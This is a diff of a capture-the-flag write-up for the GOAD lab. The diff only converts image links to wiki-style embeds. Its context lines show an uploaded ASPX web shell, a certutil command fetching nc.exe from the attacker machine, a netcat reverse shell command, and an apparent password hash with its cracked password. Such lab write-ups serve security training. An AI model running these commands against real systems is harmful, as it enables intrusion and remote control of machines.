@@ -112,13 +112,13 @@ Nmap done: 1 IP address (1 host up) scanned in 79.83 seconds
 
 http://192.168.56.22/
 
-![](../../../assets/images/Pasted%20image%2020260608233606.png)
+![[Pasted image 20260608233606.png]]
 
 http://192.168.56.22/Default.aspx
 
-![](../../../assets/images/Pasted%20image%2020260608233620.png)
+![[Pasted image 20260608233620.png]]
 
-![](../../../assets/images/Pasted%20image%2020260608233730.png)
+![[Pasted image 20260608233730.png]]
 
 ```zsh
 ┌──(kali㉿kali)-[~/CTF/GOAD/GOAD-Light]
@@ -136,13 +136,13 @@ http://192.168.56.22/Default.aspx
 
 http://192.168.56.22/upload/cmdasp.aspx
 
-![](../../../assets/images/Pasted%20image%2020260608234205.png)
+![[Pasted image 20260608234205.png]]
 
 ```zsh
 certutil -urlcache -f http://192.168.56.99/nc.exe C:\tmp\nc.exe
 ```
 
-![](../../../assets/images/Pasted%20image%2020260608234619.png)
+![[Pasted image 20260608234619.png]]
 
 ```zsh
 C:\tmp\nc.exe 192.168.56.99 4444 -e cmd
@@ -153,7 +153,7 @@ C:\tmp\nc.exe 192.168.56.99 4444 -e cmd
 # Initial Access
 
 
-![](../../../assets/images/Pasted%20image%2020260608234743.png)
+![[Pasted image 20260608234743.png]]
 
 ```zsh
 ┌──(kali㉿kali)-[~/CTF/GOAD/GOAD-Light]
@@ -240,7 +240,7 @@ SID               : S-1-5-21-1137986105-3210816010-4073059486-1113
 
 831486ac7f26860c9e2f51ac91e1a07a
 sexywolfy
-![](../../../assets/images/Pasted%20image%2020260609002155.png)
+![[Pasted image 20260609002155.png]]
 
 ```powershell
 c:\windows\system32\inetsrv>ipconfig /all
